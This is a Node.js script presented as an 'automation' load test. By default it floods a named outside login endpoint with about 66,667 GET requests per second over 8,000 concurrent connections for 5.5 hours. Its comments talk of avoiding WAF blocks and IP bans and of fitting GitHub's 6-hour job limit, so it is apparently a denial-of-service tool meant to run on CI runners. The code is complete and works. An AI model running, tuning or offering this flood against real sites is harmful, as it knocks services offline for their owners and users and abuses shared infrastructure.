import fs from 'fs/promises';
import path from 'path';
import readline from 'readline';
import https from 'https';
import http from 'http';

// Configurable constants
const TARGET_URL = process.env.TARGET_URL || 'https://2.52gs.co/chklogin.php';
const TEST_DURATION_MINUTES = parseInt(process.env.TEST_DURATION_MINUTES) || 330; // 5.5 hours (leaves 30 min buffer for GitHub's 6-hour limit)
const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 66667; // Sustainable rate to avoid WAF blocks
const CONCURRENCY_LIMIT = parseInt(process.env.CONCURRENCY_LIMIT) || 8000; // Conservative to avoid IP bans
const REQUEST_TIMEOUT_MS = parseInt(process.env.REQUEST_TIMEOUT_MS) || 5000; // 10 seconds timeout per call

async function runAutomation() {
  const testDurationMs = TEST_DURATION_MINUTES * 60 * 1000;
  const endTime = Date.now() + testDurationMs;

  console.log(`Starting GET API Automation Test`);
  console.log(`Target URL:        ${TARGET_URL}`);
  console.log(`Test Duration:     ${TEST_DURATION_MINUTES} minutes (${(TEST_DURATION_MINUTES / 60).toFixed(1)} hours)`);
  console.log(`Target RPS:        ${TARGET_RPS > 0 ? TARGET_RPS : 'Unlimited'}`);
  console.log(`Concurrency Limit: ${CONCURRENCY_LIMIT}`);
  console.log(`Request Timeout:   ${REQUEST_TIMEOUT_MS}ms`);
  console.log(`----------------------------------------------`);

  const startTime = Date.now();
  let completedCount = 0;
  let successCount = 0;
  let failureCount = 0;


  const responseTimes = [];
  const errors = new Map();
  const statusCodes = new Map();

  let dispatched = 0;
  let activeRequestsCount = 0;

  // Set up high-performance client Agent
  const parsedUrl = new URL(TARGET_URL);
  const isHttps = parsedUrl.protocol === 'https:';
  const client = isHttps ? https : http;
  const agent = new client.Agent({
    keepAlive: true,
    maxSockets: CONCURRENCY_LIMIT,
    keepAliveMsecs: 60000,
  });

  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (isHttps ? 443 : 80),
    path: parsedUrl.pathname + parsedUrl.search,
    method: 'GET',
    agent: agent,
    headers: {
      'User-Agent': 'AutomationTest/1.0',
      'Accept': 'application/json, text/plain, */*'
    }
  };

  const isTTY = process.stdout.isTTY;

  // Render a visual progress bar (time-based)
  function drawProgressBar() {
    const width = 30;
    const elapsed = Date.now() - startTime;
    const progress = Math.min(elapsed / testDurationMs, 1);
    const filledLength = Math.round(width * progress);
    const emptyLength = width - filledLength;
    const bar = '='.repeat(filledLength) + ' '.repeat(emptyLength);
    const percent = (progress * 100).toFixed(1);

    const elapsedMin = (elapsed / 60000).toFixed(1);
    const totalMin = TEST_DURATION_MINUTES;

    const statsText = `[${bar}] ${percent}% | ${elapsedMin}/${totalMin}min | Reqs: ${completedCount} | OK: ${successCount} | Fail: ${failureCount} | Active: ${activeRequestsCount}`;

    if (isTTY) {
      readline.clearLine(process.stdout, 0);
      readline.cursorTo(process.stdout, 0);
      process.stdout.write(statsText);
    } else {
      console.log(statsText);
    }
  }

  // Throttle CLI progress bar updates to prevent console bottlenecking
  let lastProgressUpdate = 0;
  const updateIntervalMs = isTTY ? 100 : 15000;

  function maybeDrawProgressBar() {
    const now = Date.now();
    if (now - lastProgressUpdate >= updateIntervalMs || now >= endTime) {
      lastProgressUpdate = now;
      drawProgressBar();
    }
  }

  // Dispatch a single HTTP GET request
  function dispatchRequest() {
    return new Promise((resolve) => {
      const requestStartTime = Date.now();
      let timedOut = false;

      const req = client.request(options, (res) => {
        // Consume body to free socket connections
        res.on('data', () => { });
        res.on('end', () => {
          if (timedOut) return;

          const duration = Date.now() - requestStartTime;
          responseTimes.push(duration);

          const status = res.statusCode;
          statusCodes.set(status, (statusCodes.get(status) || 0) + 1);

          if (status >= 200 && status < 300) {
            successCount++;
          } else {
            failureCount++;
            const statusText = `HTTP ${status} ${res.statusMessage || ''}`;
            errors.set(statusText, (errors.get(statusText) || 0) + 1);
          }

          activeRequestsCount--;
          completedCount++;
          maybeDrawProgressBar();
          resolve();
        });
      });

      req.on('error', (err) => {
        if (timedOut) return;

        failureCount++;
        const errMsg = err.code || err.message || err.toString() || 'Unknown Error';
        errors.set(errMsg, (errors.get(errMsg) || 0) + 1);

        activeRequestsCount--;
        completedCount++;
        maybeDrawProgressBar();
        resolve();
      });

      req.setTimeout(REQUEST_TIMEOUT_MS, () => {
        timedOut = true;
        req.destroy();

        failureCount++;
        errors.set('Timeout', (errors.get('Timeout') || 0) + 1);

        activeRequestsCount--;
        completedCount++;
        maybeDrawProgressBar();
        resolve();
      });

      req.end();
    });
  }



  // Duration-based scheduler
  async function startScheduler() {
    while (Date.now() < endTime) {

      // Yield if we hit max active request concurrency
      if (activeRequestsCount >= CONCURRENCY_LIMIT) {
        await new Promise((resolve) => setImmediate(resolve));
        continue;
      }

      // Rate limiting
      if (TARGET_RPS > 0) {
        const elapsedMs = Date.now() - startTime;
        const expectedDispatched = (elapsedMs / 1000) * TARGET_RPS;
        if (dispatched >= expectedDispatched) {
          await new Promise((resolve) => setTimeout(resolve, 1));
          continue;
        }
      }

      dispatched++;
      activeRequestsCount++;
      dispatchRequest();
    }
  }

  async function saveReport() {
    const durationTotalSeconds = ((Date.now() - startTime) / 1000).toFixed(2);

    responseTimes.sort((a, b) => a - b);
    const totalCalls = responseTimes.length;
    const minLatency = totalCalls > 0 ? responseTimes[0] : 0;
    const maxLatency = totalCalls > 0 ? responseTimes[totalCalls - 1] : 0;
    const avgLatency = totalCalls > 0 ? Math.round(responseTimes.reduce((a, b) => a + b, 0) / totalCalls) : 0;
    const medianLatency = totalCalls > 0 ? responseTimes[Math.floor(totalCalls / 2)] : 0;
    const p95Latency = totalCalls > 0 ? responseTimes[Math.floor(totalCalls * 0.95)] : 0;
    const p99Latency = totalCalls > 0 ? responseTimes[Math.floor(totalCalls * 0.99)] : 0;

    const summary = {
      targetUrl: TARGET_URL,
      testDurationMinutes: TEST_DURATION_MINUTES,
      totalRequests: completedCount,
      concurrencyLimit: CONCURRENCY_LIMIT,
      targetRps: TARGET_RPS,
      durationSeconds: parseFloat(durationTotalSeconds),
      requestsPerSecond: parseFloat((completedCount / durationTotalSeconds).toFixed(2)) || 0,
      successCount,
      failureCount,
      successRate: completedCount > 0 ? `${((successCount / completedCount) * 100).toFixed(1)}%` : '0%',

      latencyStatsMs: {
        min: minLatency,
        max: maxLatency,
        avg: avgLatency,
        median: medianLatency,
        p95: p95Latency,
        p99: p99Latency
      },
      statusCodes: Object.fromEntries(statusCodes.entries()),
      errors: Object.fromEntries(errors.entries())
    };

    console.log(`\n=== PERFORMANCE REPORT ===`);
    console.log(`Test Duration:     ${durationTotalSeconds}s`);
    console.log(`Total Requests:    ${completedCount}`);
    console.log(`Requests/Sec:      ${summary.requestsPerSecond}`);
    console.log(`Success Rate:      ${summary.successRate}`);
    console.log(`Min Latency:       ${minLatency}ms`);
    console.log(`Max Latency:       ${maxLatency}ms`);
    console.log(`Avg Latency:       ${avgLatency}ms`);
    console.log(`Median Latency:    ${medianLatency}ms`);
    console.log(`p95 Latency:       ${p95Latency}ms`);
    console.log(`p99 Latency:       ${p99Latency}ms`);

    if (statusCodes.size > 0) {
      console.log(`\nHTTP Status Code Distribution:`);
      for (const [code, count] of statusCodes.entries()) {
        console.log(`  - Status ${code}: ${count}`);
      }
    }

    if (errors.size > 0) {
      console.log(`\nErrors Breakdown:`);
      for (const [errMsg, count] of errors.entries()) {
        console.log(`  - ${errMsg}: ${count}`);
      }
    }

    const reportPath = path.join(process.cwd(), `summary-report-${process.pid}.json`);
    await fs.writeFile(reportPath, JSON.stringify(summary, null, 2), 'utf-8');
    console.log(`\nDetailed report written to: ${reportPath}`);
  }

  // Handle graceful shutdown on Ctrl+C (SIGINT) or SIGTERM
  let shuttingDown = false;
  const handleShutdown = async () => {
    if (shuttingDown) return;
    shuttingDown = true;
    console.log('\n\n[Ctrl+C] Interrupted. Saving report...');
    await saveReport();
    process.exit(0);
  };
  process.on('SIGINT', handleShutdown);
  process.on('SIGTERM', handleShutdown);

  // Run the scheduler and wait until all active requests have completed
  await startScheduler();
  while (activeRequestsCount > 0) {
    await new Promise((resolve) => setTimeout(resolve, 50));
  }

  console.log('\n----------------------------------------------');
  const durationTotalSeconds = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`Execution Completed in ${durationTotalSeconds}s`);

  // Remove shutdown listeners before final save to prevent double trigger
  process.off('SIGINT', handleShutdown);
  process.off('SIGTERM', handleShutdown);

  await saveReport();

  // Always exit 0 — results are in the report artifact
  console.log(`\nTest finished. Check the report artifact for detailed results.`);
  process.exit(0);
}

runAutomation().catch(err => {
  console.error('Fatal error running automation:', err);
  process.exit(1);
});
